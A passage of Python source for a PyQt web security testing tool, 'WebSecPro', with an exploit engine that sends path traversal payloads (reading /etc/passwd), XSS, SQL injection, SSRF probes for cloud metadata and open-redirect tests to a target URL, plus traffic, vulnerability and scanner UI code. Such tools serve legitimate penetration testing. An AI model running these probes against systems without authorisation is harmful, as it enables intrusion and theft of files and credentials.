    # Path traversal sequences
    TRAVERSAL_PAYLOADS = [
        ("../../../etc/passwd",       r"root:.*:/bin/(bash|sh)"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", r"root:.*:/bin/(bash|sh)"),
        ("....//....//....//etc/passwd", r"root:.*:/bin/(bash|sh)"),
        ("../../../etc/hosts",        r"(localhost|127\.0\.0\.1)"),
        ("../../../windows/system32/drivers/etc/hosts", r"(localhost|127\.0\.0\.1)"),
    ]

    def __init__(self, vuln, exploit_type="auto"):
        super().__init__()
        self.vuln = vuln
        self.exploit_type = exploit_type
        self._stop = False
        self._session = None

    def stop(self):
        self._stop = True

    def _make_session(self):
        if not HAS_REQUESTS:
            return None
        import requests as req
        s = req.Session()
        s.headers["User-Agent"] = "Mozilla/5.0 WebSecPro/2.0 Exploit Engine"
        s.verify = False
        return s

    def _get(self, url, params=None, timeout=10, allow_redirects=False):
        try:
            import requests as req
            req.packages.urllib3.disable_warnings()
        except Exception:
            pass
        try:
            t0 = time.time()
            r = self._session.get(url, params=params, timeout=timeout,
                                  allow_redirects=allow_redirects)
            ms = int((time.time() - t0) * 1000)
            return r, ms
        except Exception as exc:
            self.sig_output.emit(f"    ✗ Request error: {exc}", "fail")
            return None, 0

    def _post(self, url, data=None, timeout=10):
        try:
            import requests as req
            req.packages.urllib3.disable_warnings()
        except Exception:
            pass
        try:
            t0 = time.time()
            r = self._session.post(url, data=data, timeout=timeout, allow_redirects=False)
            ms = int((time.time() - t0) * 1000)
            return r, ms
        except Exception as exc:
            self.sig_output.emit(f"    ✗ Request error: {exc}", "fail")
            return None, 0

    def _emit_req(self, method, url, payload=""):
        safe = urllib.parse.quote(payload, safe='')
        disp_url = f"{url}?{self.vuln.parameter}={safe}" if payload else url
        self.sig_output.emit(f"    → {method} {disp_url}", "cmd")

    def run(self):
        if not HAS_REQUESTS:
            self.sig_output.emit("'requests' not installed — cannot run real exploits.", "fail")
            self.sig_done.emit(False, "Install requests library first")
            return
        self._session = self._make_session()
        v = self.vuln
        self.sig_output.emit(f"━━ EXPLOIT ENGINE: {v.vuln_type} ━━", "title")
        self.sig_output.emit(f"Target    : {v.url}", "info")
        self.sig_output.emit(f"Parameter : {v.parameter}", "info")
        self.sig_output.emit(f"Severity  : {v.severity}", "severity")
        self.sig_output.emit(f"Evidence  : {v.evidence[:120]}", "info")
        self.sig_output.emit("", "info")

        vt = v.vuln_type
        success = False

        if "XSS" in vt:
            success = self._exploit_xss(v)
        elif "SQL" in vt:
            success = self._exploit_sqli(v)
        elif "SSRF" in vt or "Server-Side Request Forgery" in vt:
            success = self._exploit_ssrf(v)
        elif "Traversal" in vt or "IDOR" in vt or "Path" in vt:
            success = self._exploit_traversal(v)
        elif "Open Redirect" in vt:
            success = self._exploit_redirect(v)
        elif "Header" in vt:
            success = self._exploit_headers(v)
        else:
            success = self._exploit_generic(v)

        self.sig_output.emit("", "info")
        if success:
            self.sig_output.emit("═══ EXPLOIT CONFIRMED ═══", "exploit_success")
            self.sig_output.emit(self._generate_report(v), "report")
            self.sig_done.emit(True, "Vulnerability confirmed with live HTTP evidence")
        else:
            self.sig_output.emit("═══ NOT CONFIRMED — may require manual testing ═══", "exploit_fail")
            self.sig_done.emit(False, "Could not automatically confirm — check raw traffic and try manual repeater")

    # ── XSS ───────────────────────────────────────────────────────────────────
    def _exploit_xss(self, v):
        self.sig_output.emit("[*] Step 1: Verify reflection (marker probe)", "step")
        marker = "xssconfirm77321"
        r, ms = self._get(v.url, params={v.parameter: marker})
        if r is None:
            return False
        if marker not in r.text:
            self.sig_output.emit(f"    ✗ Marker not reflected (status {r.status_code})", "fail")
            self.sig_output.emit("    Value not reflected — XSS may be DOM-based or stored.", "info")
            return False
        self.sig_output.emit(f"    ✓ Marker reflected in {ms}ms (status {r.status_code})", "success")

        self.sig_output.emit("[*] Step 2: Checking HTML context of reflection", "step")
        # Find where in the document the marker sits
        idx = r.text.find(marker)
        ctx_before = r.text[max(0, idx-60):idx]
        ctx_after = r.text[idx+len(marker):idx+len(marker)+60]
        self.sig_output.emit(f"    Context: ...{ctx_before}<MARKER>{ctx_after}...", "info")

        self.sig_output.emit("[*] Step 3: Trying XSS payload sequence", "step")
        for payload, pattern in self.XSS_PAYLOADS:
            if self._stop:
                return False
            self._emit_req("GET", v.url, payload)
            r2, ms2 = self._get(v.url, params={v.parameter: payload})
            if r2 is None:
                continue
            if re.search(pattern, r2.text, re.IGNORECASE):
                self.sig_output.emit(f"    ✓ Payload reflected UNESCAPED in {ms2}ms!", "success")
                self.sig_output.emit(f"    Payload: {payload}", "success")
                self.sig_output.emit(f"    Pattern matched: {pattern}", "success")
                return True
            else:
                self.sig_output.emit(f"    ✗ Payload encoded/filtered by server", "fail")
        return False

    # ── SQLi ──────────────────────────────────────────────────────────────────
    def _exploit_sqli(self, v):
        self.sig_output.emit("[*] Step 1: Baseline request", "step")
        base_params = {v.parameter: "1"}
        r_base, ms = self._get(v.url, params=base_params)
        if r_base is None:
            return False
        self.sig_output.emit(f"    ✓ Baseline: {r_base.status_code} in {ms}ms, {len(r_base.text)} bytes", "success")
        baseline_len = len(r_base.text)

        confirmed = False
        for payload, err_pattern, description in self.SQLI_PAYLOADS:
            if self._stop:
                return False
            self.sig_output.emit(f"[*] {description}", "step")
            self._emit_req("GET", v.url, payload)
            r, ms = self._get(v.url, params={v.parameter: payload})
            if r is None:
                continue
            body_low = r.text.lower()
            self.sig_output.emit(f"    Status: {r.status_code}  Length: {len(r.text)}  Time: {ms}ms", "info")

            # Check for SQL error messages
            if err_pattern:
                if re.search(err_pattern, body_low, re.IGNORECASE):
                    self.sig_output.emit(f"    ✓ SQL error/pattern detected! Pattern: {err_pattern}", "success")
                    confirmed = True
                    break

            # Check for boolean-based (significant content difference)
            delta = abs(len(r.text) - baseline_len)
            if "AND 1=2" in payload and delta > 100:
                self.sig_output.emit(f"    ✓ Boolean SQLi: response size differs by {delta} bytes (true vs false)", "success")
                confirmed = True
                break

        return confirmed

    # ── SSRF ──────────────────────────────────────────────────────────────────
    def _exploit_ssrf(self, v):
        self.sig_output.emit("[*] Testing SSRF with cloud metadata and internal targets", "step")
        for target_url, description in self.SSRF_TARGETS:
            if self._stop:
                return False
            self.sig_output.emit(f"[*] Probing: {description}", "step")
            self._emit_req("GET", v.url, target_url)
            r, ms = self._get(v.url, params={v.parameter: target_url})
            if r is None:
                continue
            self.sig_output.emit(f"    Status: {r.status_code}  Length: {len(r.text)}  Time: {ms}ms", "info")
            # Metadata responses have distinctive content
            body = r.text
            if any(sig in body for sig in [
                "ami-id", "instance-id", "local-ipv4", "iam/security-credentials",
                "computeMetadata", "root:x:0:", "127.0.0.1", "+PONG"
            ]):
                self.sig_output.emit(f"    ✓ SSRF confirmed! Internal content retrieved.", "success")
                self.sig_output.emit(f"    Response preview: {body[:200]}", "success")
                return True
            elif r.status_code == 200 and len(body) > 10:
                self.sig_output.emit(f"    Possible SSRF — 200 OK with content, inspect manually", "warning")
        return False

    # ── Path Traversal ────────────────────────────────────────────────────────
    def _exploit_traversal(self, v):
        self.sig_output.emit("[*] Testing path traversal sequences", "step")
        for payload, pattern in self.TRAVERSAL_PAYLOADS:
            if self._stop:
                return False
            self._emit_req("GET", v.url, payload)
            r, ms = self._get(v.url, params={v.parameter: payload})
            if r is None:
                continue
            self.sig_output.emit(f"    Status: {r.status_code}  Length: {len(r.text)}  Time: {ms}ms", "info")
            if r.status_code == 200 and re.search(pattern, r.text):
                self.sig_output.emit(f"    ✓ Path traversal confirmed! File contents retrieved.", "success")
                self.sig_output.emit(f"    Preview: {r.text[:300]}", "success")
                return True
        return False

    # ── Open Redirect ─────────────────────────────────────────────────────────
    def _exploit_redirect(self, v):
        self.sig_output.emit("[*] Testing open redirect with external canary", "step")
        canary = "https://www.example.com/redirected_by_websecpro"
        redirects = [canary, f"//{urllib.parse.urlparse(canary).netloc}",
                     f"///example.com", "//example.com/%2F.."]
        for target in redirects:
            if self._stop:
                return False
            self._emit_req("GET", v.url, target)
            r, ms = self._get(v.url, params={v.parameter: target}, allow_redirects=False)
            if r is None:
                continue
            loc = r.headers.get("Location", "")
            self.sig_output.emit(f"    Status: {r.status_code}  Location: {loc}", "info")
            if r.status_code in (301, 302, 303, 307, 308) and "example.com" in loc:
                self.sig_output.emit(f"    ✓ Open redirect confirmed to: {loc}", "success")
                return True
        return False

    # ── Header check ─────────────────────────────────────────────────────────
    def _exploit_headers(self, v):
        self.sig_output.emit("[*] Verifying missing security headers live", "step")
        r, ms = self._get(v.url)
        if r is None:
            return False
        missing = []
        required = ["strict-transport-security", "x-frame-options",
                    "x-content-type-options", "content-security-policy"]
        for h in required:
            val = r.headers.get(h, None)
            status = f"✓ {h}: {val}" if val else f"✗ MISSING: {h}"
            self.sig_output.emit(f"    {status}", "success" if val else "fail")
            if not val:
                missing.append(h)
        if missing:
            self.sig_output.emit(f"\n    {len(missing)} security header(s) confirmed missing.", "success")
            return True
        return False

    # ── Generic probe ─────────────────────────────────────────────────────────
    def _exploit_generic(self, v):
        self.sig_output.emit("[*] Generic probe — sending original payload", "step")
        self._emit_req("GET", v.url, v.payload)
        r, ms = self._get(v.url, params={v.parameter: v.payload} if v.parameter else None)
        if r is None:
            return False
        self.sig_output.emit(f"    Status: {r.status_code}  Length: {len(r.text)}  Time: {ms}ms", "info")
        if r.status_code == 200 and v.evidence and any(
            s in r.text for s in v.evidence.split()[:3] if len(s) > 4
        ):
            self.sig_output.emit("    ✓ Evidence pattern found in live response.", "success")
            return True
        self.sig_output.emit("    No definitive confirmation — review raw response in Traffic tab.", "fail")
        return False

    def _generate_report(self, v):
        return (
            f"\n  Vulnerability : {v.vuln_type}\n"
            f"  Severity      : {v.severity}\n"
            f"  URL           : {v.url}\n"
            f"  Parameter     : {v.parameter}\n"
            f"  Payload       : {v.payload}\n"
            f"  Evidence      : {v.evidence}\n"
            f"  Confirmed     : YES (live HTTP)\n"
            f"  Timestamp     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        )


# ─── HTTP TRAFFIC TABLE ───────────────────────────────────────────────────────
class HttpTrafficTable(QTableWidget):
    sig_send_to_repeater  = pyqtSignal(object)
    sig_send_to_manual    = pyqtSignal(object)

    COLS = ["#", "Method", "Host", "Path", "Status", "Length", "Time(ms)", "Content-Type"]

    def __init__(self, parent=None):
        super().__init__(0, len(self.COLS), parent)
        self.setHorizontalHeaderLabels(self.COLS)
        self.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.setAlternatingRowColors(True)
        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self._context_menu)
        self.entries = []
        self.setColumnWidth(0, 45)
        self.setColumnWidth(1, 65)
        self.setColumnWidth(4, 60)
        self.setColumnWidth(5, 70)
        self.setColumnWidth(6, 75)
        self.setColumnWidth(7, 130)

    def add_entry(self, entry: HttpEntry):
        self.entries.append(entry)
        row = self.rowCount()
        self.insertRow(row)
        self.setRowHeight(row, 26)

        def cell(text, color=None, bold=False, align=Qt.AlignLeft | Qt.AlignVCenter):
            item = QTableWidgetItem(str(text))
            item.setTextAlignment(align)
            if color:
                item.setForeground(QColor(color))
            if bold:
                f = item.font()
                f.setBold(True)
                item.setFont(f)
            return item

        status_color = STATUS_COLORS.get(entry.status // 100 if entry.status else 0, "#888888")
        method_color = HTTP_METHOD_COLORS.get(entry.method, "#cccccc")

        self.setItem(row, 0, cell(entry.id, "#4a7a9a", align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 1, cell(entry.method, method_color, bold=True, align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 2, cell(entry.host))
        self.setItem(row, 3, cell(entry.path))
        self.setItem(row, 4, cell(entry.status or "?", status_color, bold=True, align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 5, cell(f"{entry.content_length:,}", "#8888aa", align=Qt.AlignRight | Qt.AlignVCenter))
        self.setItem(row, 6, cell(entry.response_time, "#7a8888", align=Qt.AlignRight | Qt.AlignVCenter))
        self.setItem(row, 7, cell(entry.content_type, "#688888"))

        # Scroll to bottom
        self.scrollToBottom()

    def selected_entry(self):
        rows = self.selectedItems()
        if not rows:
            return None
        row = self.currentRow()
        if row < len(self.entries):
            return self.entries[row]
        return None

    def _context_menu(self, pos):
        entry = self.selected_entry()
        menu = QMenu(self)
        if entry:
            a1 = menu.addAction("🔍  Send to Repeater / Manual Test")
            a2 = menu.addAction("📋  Copy URL")
            a3 = menu.addAction("📋  Copy as cURL")
            menu.addSeparator()
            a4 = menu.addAction("🏷  Tag as Interesting")
            a5 = menu.addAction("🗑  Remove Entry")
            chosen = menu.exec_(self.viewport().mapToGlobal(pos))
            if chosen == a1:
                self.sig_send_to_repeater.emit(entry)
            elif chosen == a2:
                QApplication.clipboard().setText(entry.url)
            elif chosen == a3:
                self.sig_send_to_repeater.emit(entry)
            elif chosen == a4:
                entry.tags.append("interesting")
                self._highlight_row(self.currentRow(), QColor("#1a3a10"))
            elif chosen == a5:
                self.removeRow(self.currentRow())
                del self.entries[self.currentRow()]

    def _highlight_row(self, row, color):
        for col in range(self.columnCount()):
            item = self.item(row, col)
            if item:
                item.setBackground(color)


# ─── VULN TABLE ───────────────────────────────────────────────────────────────
class VulnTable(QTableWidget):
    sig_send_to_exploit = pyqtSignal(object)
    sig_selected        = pyqtSignal(object)   # emits VulnEntry on row click

    COLS = ["Sev", "CVSS", "Type", "URL", "Parameter", "Description"]

    def __init__(self, parent=None):
        super().__init__(0, len(self.COLS), parent)
        self.setHorizontalHeaderLabels(self.COLS)
        self.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        self.horizontalHeader().setSectionResizeMode(5, QHeaderView.Stretch)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.setAlternatingRowColors(True)
        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self._context_menu)
        self.itemSelectionChanged.connect(self._on_select)
        self.vulns = []
        self.setColumnWidth(0, 72)
        self.setColumnWidth(1, 52)
        self.setColumnWidth(2, 210)
        self.setColumnWidth(4, 100)

    def add_vuln(self, vuln: VulnEntry):
        self.vulns.append(vuln)
        row = self.rowCount()
        self.insertRow(row)
        self.setRowHeight(row, 26)
        color = SEVERITY.get(vuln.severity, "#cccccc")

        def cell(text, c=None, bold=False, align=Qt.AlignLeft | Qt.AlignVCenter):
            item = QTableWidgetItem(str(text))
            item.setTextAlignment(align)
            item.setForeground(QColor(c or "#c8d8e8"))
            if bold:
                f = item.font(); f.setBold(True); item.setFont(f)
            return item

        # CVSS colour: ≥9 red, ≥7 orange, ≥4 yellow, else green
        score = vuln.cvss_score
        cvss_color = ("#ff3030" if score >= 9.0 else
                      "#ff8040" if score >= 7.0 else
                      "#ffcc40" if score >= 4.0 else "#40cc80")

        sev_item = cell(vuln.severity, color, bold=True, align=Qt.AlignCenter | Qt.AlignVCenter)
        self.setItem(row, 0, sev_item)
        self.setItem(row, 1, cell(f"{score:.1f}", cvss_color, bold=True, align=Qt.AlignCenter | Qt.AlignVCenter))
        self.setItem(row, 2, cell(vuln.vuln_type, "#d0a870"))
        self.setItem(row, 3, cell(vuln.url))
        self.setItem(row, 4, cell(vuln.parameter, "#88aacc"))
        self.setItem(row, 5, cell(vuln.description, "#a0b8a0"))

        bg = {
            "CRITICAL": QColor("#2a0a0a"), "HIGH": QColor("#251008"),
            "MEDIUM":   QColor("#1e1608"), "LOW":  QColor("#08181e"),
            "INFO":     QColor("#081808"),
        }.get(vuln.severity, QColor("#0d1220"))
        for col in range(self.columnCount()):
            item = self.item(row, col)
            if item:
                item.setBackground(bg)
        self.scrollToBottom()

    def selected_vuln(self):
        row = self.currentRow()
        if 0 <= row < len(self.vulns):
            return self.vulns[row]
        return None

    def _on_select(self):
        v = self.selected_vuln()
        if v:
            self.sig_selected.emit(v)

    def _context_menu(self, pos):
        vuln = self.selected_vuln()
        menu = QMenu(self)
        if vuln:
            a1 = menu.addAction("⚡  Send to Exploitation Tab")
            a2 = menu.addAction("📋  Copy Details")
            a_curl = menu.addAction("📋  Copy as cURL")
            menu.addSeparator()
            a3 = menu.addAction("✓  Mark as Confirmed")
            a4 = menu.addAction("✗  Mark as False Positive")
            chosen = menu.exec_(self.viewport().mapToGlobal(pos))
            if chosen == a1:
                self.sig_send_to_exploit.emit(vuln)
            elif chosen == a2:
                txt = (f"[{vuln.severity}] {vuln.vuln_type}\n"
                       f"URL: {vuln.url}\nParameter: {vuln.parameter}\n"
                       f"Payload: {vuln.payload}\nEvidence: {vuln.evidence}\n"
                       f"CVSS: {vuln.cvss_score} ({vuln.cvss_vector})")
                QApplication.clipboard().setText(txt)
            elif chosen == a_curl:
                param_str = f"?{vuln.parameter}={urllib.parse.quote(vuln.payload)}" if vuln.parameter and vuln.payload else ""
                curl = f"curl -sk '{vuln.url}{param_str}'"
                QApplication.clipboard().setText(curl)
            elif chosen == a3:
                vuln.confirmed = True
                for col in range(self.columnCount()):
                    item = self.item(self.currentRow(), col)
                    if item: item.setBackground(QColor("#0a2a12"))
            elif chosen == a4:
                for col in range(self.columnCount()):
                    item = self.item(self.currentRow(), col)
                    if item: item.setForeground(QColor("#444444"))


# ─── REQUEST/RESPONSE EDITOR ─────────────────────────────────────────────────
class RequestResponsePanel(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(4)

        splitter = QSplitter(Qt.Horizontal)

        # Request side
        req_widget = QWidget()
        req_widget.setMaximumWidth(650)
        req_layout = QVBoxLayout(req_widget)
        req_layout.setContentsMargins(4, 4, 4, 4)
        req_layout.setSpacing(4)
        req_label = QLabel("◀  REQUEST")
        req_label.setObjectName("sectionLabel")
        req_layout.addWidget(req_label)
        self.req_editor = QTextEdit()
        self.req_editor.setPlaceholderText("HTTP request will appear here...\nRight-click traffic entries to load.")
        HttpHighlighter(self.req_editor.document())
        req_layout.addWidget(self.req_editor)

        # Response side with tabs (raw / rendered)
        resp_widget = QWidget()
        resp_layout = QVBoxLayout(resp_widget)
        resp_layout.setContentsMargins(4, 4, 4, 4)
        resp_layout.setSpacing(4)
        resp_label = QLabel("▶  RESPONSE")
        resp_label.setObjectName("sectionLabel")
        resp_layout.addWidget(resp_label)

        self.resp_tabs = QTabWidget()
        self.resp_raw = QTextEdit()
        self.resp_raw.setReadOnly(True)
        HttpHighlighter(self.resp_raw.document())
        self.resp_render = QWebEngineView()
        self.resp_render.setUrl(QUrl("about:blank"))
        self.resp_tabs.addTab(self.resp_raw, "RAW")
        self.resp_tabs.addTab(self.resp_render, "RENDER")
        resp_layout.addWidget(self.resp_tabs)

        splitter.addWidget(req_widget)
        splitter.addWidget(resp_widget)
        splitter.setSizes([1, 1])
        layout.addWidget(splitter)

    def load_entry(self, entry: HttpEntry):
        self.req_editor.setPlainText(entry.format_request())
        self.resp_raw.setPlainText(entry.format_response())
        ct = entry.content_type
        if "html" in ct:
            self.resp_render.setHtml(entry.response_body or "")
        elif "json" in ct:
            try:
                pretty = json.dumps(json.loads(entry.response_body), indent=2)
                self.resp_render.setHtml(f"<pre style='background:#080c18;color:#a0c880;font-family:monospace;padding:10px'>{pretty}</pre>")
            except Exception:
                self.resp_render.setHtml(f"<pre>{entry.response_body}</pre>")
        else:
            self.resp_render.setHtml(f"<pre style='background:#080c18;color:#a0c880;font-family:monospace;padding:10px'>{entry.response_body}</pre>")


# ─── TRAFFIC TAB ─────────────────────────────────────────────────────────────
class TrafficTab(QWidget):
    sig_send_to_repeater = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._build_ui()

    def _build_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(6, 6, 6, 6)
        main_layout.setSpacing(6)

        # Filter bar
        filter_bar = QHBoxLayout()
        filter_bar.addWidget(QLabel("FILTER:"))
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("Filter by URL, method, status...")
        self.filter_input.textChanged.connect(self._apply_filter)
        filter_bar.addWidget(self.filter_input)
        filter_bar.addWidget(QLabel("Method:"))
        self.method_filter = QComboBox()
        self.method_filter.addItems(["ALL", "GET", "POST", "PUT", "DELETE", "PATCH"])
        self.method_filter.currentTextChanged.connect(self._apply_filter)
        filter_bar.addWidget(self.method_filter)
        filter_bar.addWidget(QLabel("Status:"))
        self.status_filter = QComboBox()
        self.status_filter.addItems(["ALL", "2xx", "3xx", "4xx", "5xx"])
        self.status_filter.currentTextChanged.connect(self._apply_filter)
        filter_bar.addWidget(self.status_filter)
        clear_btn = QPushButton("CLEAR")
        clear_btn.clicked.connect(self._clear_traffic)
        filter_bar.addWidget(clear_btn)
        main_layout.addLayout(filter_bar)

        splitter = QSplitter(Qt.Vertical)

        # Traffic table
        table_widget = QWidget()
        tl = QVBoxLayout(table_widget)
        tl.setContentsMargins(0, 0, 0, 0)
        section = QLabel("HTTP TRAFFIC  —  right-click to send to Repeater")
        section.setObjectName("sectionLabel")
        tl.addWidget(section)
        self.traffic_table = HttpTrafficTable()
        self.traffic_table.sig_send_to_repeater.connect(self.sig_send_to_repeater)
        self.traffic_table.itemSelectionChanged.connect(self._on_row_select)
        tl.addWidget(self.traffic_table)
        splitter.addWidget(table_widget)

        # Request/Response panel
        self.rr_panel = RequestResponsePanel()
        splitter.addWidget(self.rr_panel)
        splitter.setSizes([350, 300])

        main_layout.addWidget(splitter)

    def add_entry(self, entry):
        self.traffic_table.add_entry(entry)

    def _on_row_select(self):
        entry = self.traffic_table.selected_entry()
        if entry:
            self.rr_panel.load_entry(entry)

    def _apply_filter(self):
        text = self.filter_input.text().lower()
        method = self.method_filter.currentText()
        status_filter = self.status_filter.currentText()
        for row in range(self.traffic_table.rowCount()):
            if row >= len(self.traffic_table.entries):
                break
            e = self.traffic_table.entries[row]
            show = True
            if text and text not in (e.url + str(e.status)).lower():
                show = False
            if method != "ALL" and e.method != method:
                show = False
            if status_filter != "ALL" and e.status:
                prefix = int(status_filter[0])
                if e.status // 100 != prefix:
                    show = False
            self.traffic_table.setRowHidden(row, not show)

    def _clear_traffic(self):
        self.traffic_table.setRowCount(0)
        self.traffic_table.entries.clear()


# ─── SCANNER TAB ─────────────────────────────────────────────────────────────
class ScannerTab(QWidget):
    sig_http_entry = pyqtSignal(object)
    sig_vuln       = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.worker = None
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        # Target config
        tgt_group = QGroupBox("TARGET CONFIGURATION")
        tgt_layout = QFormLayout(tgt_group)
        tgt_layout.setSpacing(8)
        self.url_input = QLineEdit("https://example.com")
        tgt_layout.addRow("Target URL:", self.url_input)
        self.depth_spin = QSpinBox()
        self.depth_spin.setRange(1, 10)
        self.depth_spin.setValue(3)
        tgt_layout.addRow("Crawl Depth:", self.depth_spin)
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 20)
        self.threads_spin.setValue(5)
        tgt_layout.addRow("Threads:", self.threads_spin)
        layout.addWidget(tgt_group)

        # Scan options
        opts_group = QGroupBox("SCAN MODULES")
        opts_layout = QHBoxLayout(opts_group)
        opts_layout.setSpacing(16)
        self.cb_crawl   = QCheckBox("Web Crawler")       ; self.cb_crawl.setChecked(True)
        self.cb_xss     = QCheckBox("XSS Detection")     ; self.cb_xss.setChecked(True)
        self.cb_sqli    = QCheckBox("SQL Injection")      ; self.cb_sqli.setChecked(True)
        self.cb_headers = QCheckBox("Security Headers")   ; self.cb_headers.setChecked(True)
        self.cb_csrf    = QCheckBox("CSRF Detection")     ; self.cb_csrf.setChecked(True)
        self.cb_ssrf    = QCheckBox("SSRF/XXE")           ; self.cb_ssrf.setChecked(True)
        self.cb_idor    = QCheckBox("IDOR/Path Traversal"); self.cb_idor.setChecked(True)
        for cb in [self.cb_crawl, self.cb_xss, self.cb_sqli,
                   self.cb_headers, self.cb_csrf, self.cb_ssrf, self.cb_idor]:
            opts_layout.addWidget(cb)
        opts_layout.addStretch()
        layout.addWidget(opts_group)

        # Controls
        ctrl_row = QHBoxLayout()
        self.btn_scan = QPushButton("▶  START SCAN")
        self.btn_scan.setObjectName("btnSuccess")
        self.btn_scan.clicked.connect(self.start_scan)
        self.btn_stop = QPushButton("■  STOP")
        self.btn_stop.setObjectName("btnDanger")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self.stop_scan)
        self.progress = QProgressBar()
        self.progress.setValue(0)
        self.progress_label = QLabel("IDLE")
        self.progress_label.setMinimumWidth(200)
        ctrl_row.addWidget(self.btn_scan)
        ctrl_row.addWidget(self.btn_stop)
        ctrl_row.addWidget(self.progress, 1)
        ctrl_row.addWidget(self.progress_label)
        layout.addLayout(ctrl_row)

        # Stats bar
        stats_row = QHBoxLayout()
        self.stat_requests = self._stat_box("REQUESTS", "0")
        self.stat_vulns    = self._stat_box("VULNERABILITIES", "0")
        self.stat_critical = self._stat_box("CRITICAL", "0")
        self.stat_high     = self._stat_box("HIGH", "0")
        self.stat_medium   = self._stat_box("MEDIUM", "0")
        for box in [self.stat_requests, self.stat_vulns, self.stat_critical, self.stat_high, self.stat_medium]:
            stats_row.addWidget(box)
        stats_row.addStretch()
        layout.addLayout(stats_row)

        # Log
        log_label = QLabel("SCAN LOG")
        log_label.setObjectName("sectionLabel")
        layout.addWidget(log_label)
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.document().setMaximumBlockCount(1000)
        layout.addWidget(self.log, 1)

        self._req_count = 0
        self._vuln_counts = {}

    def _stat_box(self, label, value):
        frame = QFrame()
        frame.setFrameShape(QFrame.StyledPanel)
        frame.setStyleSheet("QFrame { border: 1px solid #1e3a5f; border-radius: 3px; padding: 4px 8px; }")
        fl = QVBoxLayout(frame)
        fl.setContentsMargins(6, 4, 6, 4)
        fl.setSpacing(2)
        lbl = QLabel(label)
        lbl.setStyleSheet("color: #4a7a9a; font-size: 9px; letter-spacing: 2px;")
        val = QLabel(value)
        val.setStyleSheet("color: #00d4ff; font-size: 18px; font-weight: bold;")
        fl.addWidget(lbl)
        fl.addWidget(val)
        frame._val_label = val
        return frame

    def _update_stat(self, frame, value):
        frame._val_label.setText(str(value))

    def start_scan(self):
        url = self.url_input.text().strip()
        if not url:
            self.log.append('<span style="color:#ff4040">✗ No target URL specified.</span>')
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.url_input.setText(url)

        self.log.clear()
        self.progress.setValue(0)
        self._req_count = 0
        self._vuln_counts = {}
        for box in [self.stat_requests, self.stat_vulns, self.stat_critical, self.stat_high, self.stat_medium]:
            self._update_stat(box, 0)

        options = {
            "vuln_scan": True,
            "depth": self.depth_spin.value(),
            "threads": self.threads_spin.value(),
            "modules": {
                "crawl":   self.cb_crawl.isChecked(),
                "xss":     self.cb_xss.isChecked(),
                "sqli":    self.cb_sqli.isChecked(),
                "headers": self.cb_headers.isChecked(),
                "csrf":    self.cb_csrf.isChecked(),
                "ssrf":    self.cb_ssrf.isChecked(),
                "idor":    self.cb_idor.isChecked(),
            }
        }
        self.worker = ScanWorker(url, options)
        self.worker.sig_progress.connect(self._on_progress, Qt.QueuedConnection)
        self.worker.sig_http_entry.connect(self._on_http, Qt.QueuedConnection)
        self.worker.sig_vuln.connect(self._on_vuln, Qt.QueuedConnection)
        self.worker.sig_log.connect(self._on_log, Qt.QueuedConnection)
        self.worker.sig_done.connect(self._on_done, Qt.QueuedConnection)
        self.worker.start()
        self.btn_scan.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_scan(self):
        if self.worker:
            self.worker.stop()
        self.btn_scan.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self._on_log("Scan stopped by user.", "warning")

    @pyqtSlot(int, str)
    def _on_progress(self, pct, msg):
        self.progress.setValue(pct)
        self.progress_label.setText(msg)

    @pyqtSlot(object)
    def _on_http(self, entry):
        self._req_count += 1
        self._update_stat(self.stat_requests, self._req_count)
        self.sig_http_entry.emit(entry)

    @pyqtSlot(object)
    def _on_vuln(self, vuln):
        self._vuln_counts[vuln.severity] = self._vuln_counts.get(vuln.severity, 0) + 1
        total = sum(self._vuln_counts.values())
        self._update_stat(self.stat_vulns, total)
        self._update_stat(self.stat_critical, self._vuln_counts.get("CRITICAL", 0))
        self._update_stat(self.stat_high, self._vuln_counts.get("HIGH", 0))
        self._update_stat(self.stat_medium, self._vuln_counts.get("MEDIUM", 0))
        self.sig_vuln.emit(vuln)

    @pyqtSlot(str, str)
    def _on_log(self, msg, level):
        colors = {
            "info":    "#7ab8d4",
            "success": "#50cc80",
            "warning": "#ffaa30",
            "error":   "#ff5050",
        }
        color = colors.get(level, "#c8d8e8")
        ts = datetime.now().strftime("%H:%M:%S")
        msg_esc = msg.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.log.append(f'<span style="color:#334455">[{ts}]</span> <span style="color:{color}">{msg_esc}</span>')

    @pyqtSlot(str)
    def _on_done(self, summary):
        self.btn_scan.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self._on_log(f"✓ {summary}", "success")


# ─── VULNERABILITY TAB ───────────────────────────────────────────────────────
class VulnTab(QWidget):
    sig_send_to_exploit = pyqtSignal(object)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._vulns = []
        self._build_ui()

